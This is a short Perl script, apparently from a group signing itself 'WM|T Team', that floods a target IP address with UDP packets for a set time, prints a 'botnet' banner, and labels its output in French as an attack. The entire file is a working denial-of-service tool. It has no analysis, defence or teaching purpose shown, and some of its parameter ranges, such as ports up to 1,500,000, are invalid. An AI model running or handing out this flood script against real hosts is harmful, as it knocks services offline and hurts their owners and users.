 #!/usr/bin/perl

##
# WM|T Team 
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
use Term::ANSIColor;
print color 'red';
print <<EOTEXT;

 _           _              _   
| |__   ___ | |_ _ __   ___| |_ 
| '_ \ / _ \| __| '_ \ / _ \ __|
| |_) | (_) | |_| | | |  __/ |_ 
|_.__/ \___/ \__|_| |_|\___|\__|


EOTEXT
use Term::ANSIColor;
print color 'cyan';
print "IP Used: $ip " . "Port Used: " . ($port ? $port : "random") . " 
Power Of Attack: " .
  ($size ? "$size BYTE(S)" : "SERVER MAX POWER !") . " 
" .
  ($time ? " POUR $time SECONDE(S)" : "") . "\n";
print "STOPPER L'ATTAQUE: CTRL + C" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, 
$iaddr));}          
